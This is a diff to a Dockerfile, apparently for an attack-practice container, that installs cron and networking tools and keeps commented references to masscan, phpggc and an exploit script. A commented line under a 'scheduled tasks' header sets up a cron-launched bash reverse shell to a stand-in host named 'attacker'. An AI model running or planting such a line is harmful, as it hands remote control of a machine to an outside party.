@@ -7,11 +7,20 @@ RUN apt-get update && apt-get install -y ca-certificates && \
     sed -i 's#archive.ubuntu.com#mirrors.aliyun.com#g' /etc/apt/sources.list && \
     sed -i 's#security.debian.org#mirrors.aliyun.com#g' /etc/apt/sources.list && \
     sed -i 's#security.ubuntu.com#mirrors.aliyun.com#g' /etc/apt/sources.list && \
-    sed -i 's#http:#https:#g' /etc/apt/sources.list && apt-get -y update
+    sed -i 's#http:#https:#g' /etc/apt/sources.list && apt-get update
 # Install dependencies
-# RUN apt-get install -y git python3 python3-pip net-tools masscan iputils-ping libpcap-dev openssh-client php
+RUN apt-get install -y net-tools iputils-ping cron
+# RUN apt-get install -y git python3 python3-pip masscan libpcap-dev openssh-client php
 # RUN pip3 install requests -i https://mirrors.aliyun.com/pypi/simple/ && \
     # git clone https://github.com/ambionics/phpggc.git
+
+# 定时任务
+# RUN echo 'nohup bash -c "bash -i >& /dev/tcp/attacker/2333 0>&1" &' | crontab -
+# RUN echo '* * * * * echo "1" >> ~/lastcmd' | crontab -
+
+
+# 攻击脚本
 # COPY exploit.py .
 
 CMD ["sleep", "infinity"]
+# CMD ["service", "cron", "start"]
